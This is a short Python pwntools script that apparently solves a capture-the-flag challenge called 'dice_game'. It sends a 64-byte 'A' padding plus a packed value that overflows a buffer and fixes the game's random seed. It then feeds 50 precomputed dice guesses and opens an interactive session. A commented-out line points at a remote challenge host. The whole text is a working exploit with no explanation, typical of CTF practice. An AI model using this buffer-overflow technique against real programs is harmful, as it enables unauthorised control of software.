from pwn import *
#libc = ELF("./libc.so.6")
elf = ELF("./dice_game")
list = "2 5 4 2 6 2 5 1 4 2 3 2 3 2 6 5 1 1 5 5 6 3 4 4 3 3 3 2 2 2 6 1 1 1 6 4 2 5 2 5 4 4 4 6 3 2 3 3 6 1 "
list = list.split(" ")
#print list
#h,p= '111.200.241.244',50915
#p = remote(h,p)
p = process('./dice_game')
#gdb.attach('dice_game')
exp = "A"*0x40+p64(1)
p.sendline(exp)
for i in range(50):
	p.sendlineafter("Give me the point(1~6):",list[i])
p.interactive()
